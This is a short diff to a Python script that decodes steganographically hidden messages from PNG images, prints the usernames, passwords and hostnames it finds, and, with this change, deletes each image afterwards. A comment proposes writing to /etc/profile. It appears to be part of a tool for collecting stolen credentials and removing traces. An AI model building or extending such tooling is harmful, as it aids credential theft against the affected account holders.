@@ -1,5 +1,5 @@
 import glob
-from os import path
+from os import path, remove
 import stepic
 from datetime import datetime
 import Image
@@ -38,9 +38,12 @@ for infile in glob.glob(decode_dir+"*.png"):
 	if isvalidformat(msg):
 		login = getdetails(msg)
 		print "<b>Username</b> :", login[1], "<br/><b>Password</b> :", login[0], "<br/><b>Hostname:</b>",login[2],"<br/><br/>"
+	remove(infile)
 
 f = open('updated.txt','w+')			# Change file to /etc/profile
 f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 f.close()
+
+
 
 
